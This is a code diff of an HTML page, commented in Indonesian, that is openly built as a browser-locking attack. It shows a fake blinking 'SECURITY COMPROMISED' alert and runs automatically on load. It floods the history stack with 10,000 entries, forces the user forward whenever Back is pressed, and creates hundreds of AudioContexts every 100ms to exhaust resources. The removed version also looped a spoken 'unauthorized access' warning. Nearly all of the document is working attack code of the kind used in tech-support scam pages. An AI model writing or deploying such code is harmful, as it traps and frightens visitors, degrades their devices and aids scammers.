@@ -3,94 +3,83 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert &amp; State System</title>
+<title>System Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #030712; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-  .box { padding: 24px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; text-align: center; max-width: 400px; }
-  h2 { color: #f8fafc; margin-bottom: 8px; font-size: 18px; }
-  p { color: #9ca3af; font-size: 13px; line-height: 1.5; }
+  body {
+    background: #030712; color: #f8fafc;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0; text-align: center;
+  }
+  .box { padding: 30px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; max-width: 400px; }
+  h2 { color: #f00; margin-bottom: 10px; animation: blink 0.5s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  p { color: #9ca3af; font-size: 14px; line-height: 1.5; }
+  #status { margin-top: 20px; font-family: monospace; color: #0f0; background: #000; padding: 10px; border-radius: 6px; }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>Verifikasi Keamanan Sistem</h2>
-  <p>Sistem sedang memproses pembaruan keamanan latar belakang. Mohon tetap di halaman ini...</p>
+  <h2>🚨 SECURITY COMPROMISED 🚨</h2>
+  <p>Sistem mendeteksi aktivitas mencurigakan. Tombol navigasi dinonaktifkan sementara untuk verifikasi.</p>
+  <div id="status">Menginisialisasi...</div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  var CONFIG = {
-    tts: {
-      text: "Security Alert. Unauthorized access detected. Please verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.9,
-      repeatInterval: 6000,
-      maxRepeats: 15
-    }
-  };
+  var statusEl = document.getElementById('status');
+  var floodCount = 0;
 
-  var state = { ttsStarted: false, ttsCount: 0 };
-
-  // 1. Modul Audio & TTS (Speech Synthesis Loop)
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
-
-      window.speechSynthesis.speak(u);
-    } catch (e) {}
-  }
-
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    try { window.speechSynthesis.cancel(); } catch(e){}
-    speakOnce();
-  }
-
-  // 2. Modul AudioContext Unlocking & Pressure
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
-      }
-    } catch (e) {}
-  }
-
-  // 3. Modul Chaining: History / Omnibox Flooding (Locks Back Button & History Stack)
+  // ============================================
+  // 1. HISTORY FLOODING (OMNIBox STACK OVERLOAD)
+  // ============================================
   function triggerHistoryFlood() {
-    console.log("[!] Initiating History & Omnibox State Flooding...");
+    console.log("[!] Memulai History Flooding...");
+    statusEl.innerText = "Flooding History Stack...";
+
     try {
-      // Mengisi history stack secara masif agar tombol Back peramban terkunci
-      for (var i = 0; i < 5000; i++) {
-        var dummyState = { page: i, timestamp: Date.now() };
-        history.pushState(dummyState, "Security Alert #" + i, "#secure-state-" + i);
+      // Memasukkan 10.000 entri ke History Stack
+      for (var i = 0; i < 10000; i++) {
+        var dummyState = { page: i, time: Date.now() };
+        var fakeUrl = window.location.pathname + "#locked=" + i;
+        
+        // Menggunakan pushState untuk mengisi Omnibox (Address Bar)
+        history.pushState(dummyState, "Security Verification " + i, fakeUrl);
+        
+        floodCount++;
       }
-    } catch (e) {
-      console.log("[!] History flood limit reached:", e.message);
+      
+      statusEl.innerText = "History Flooded: " + floodCount + " entries.";
+      console.log("[+] History Flooding Selesai.");
+
+    } catch(e) {
+      statusEl.innerText = "Limit Reached: " + e.message;
     }
   }
 
-  // 4. Modul Chaining: Audio Node Resource Pressure
+  // ============================================
+  // 2. POPSTATE LOCK (MENCEGAH TOMBOL BACK)
+  // ============================================
+  window.addEventListener('popstate', function(e) {
+    // Jika user mencoba mundur, kita dorong maju lagi secara paksa
+    if (floodCount > 0) {
+      history.go(1);
+      statusEl.innerText = "🚫 Navigation Blocked. Klik Back tidak berfungsi.";
+      console.log("[!] User mencoba Back. Diblokir.");
+    }
+  });
+
+  // ============================================
+  // 3. AUDIO PRESSURE (RESOURCE EXHAUSTION)
+  // ============================================
   function triggerAudioPressure() {
     setInterval(function() {
       try {
+        // Alokasi 500 AudioContext per 100ms
         for (var i = 0; i < 500; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
@@ -105,25 +94,23 @@
     }, 100);
   }
 
-  // Eksekusi Rantai Eksploitasi
-  unlockAudioContext();
+  // ============================================
+  // 4. EKSEKUSI CHAIN
+  // ============================================
   
-  setTimeout(function () {
-    startTTS();
-  }, 500);
+  // Jalankan flooding setelah 500ms
+  setTimeout(triggerHistoryFlood, 500);
 
-  setTimeout(function () {
-    // Panggil rantai penekanan sumber daya dan penguncian history
-    triggerHistoryFlood();
+  // Jalankan audio pressure setelah 1.2 detik
+  setTimeout(function() {
+    console.log("[!] Memulai Audio Pressure...");
     triggerAudioPressure();
   }, 1200);
 
-  // Penanganan Listener Popstate untuk mempertahankan penguncian state
-  window.addEventListener('popstate', function(event) {
-    try {
-      history.pushState({ locked: true }, "Security Alert", "#locked-state");
-    } catch(e) {}
-  });
+  // ============================================
+  // 5. ZERO-CLICK TRIGGER (LANGSUNG SAAT LOAD)
+  // ============================================
+  // (Fungsi di atas sudah dipanggil via setTimeout, jadi sudah Zero-Click)
 
 })();
 </script>
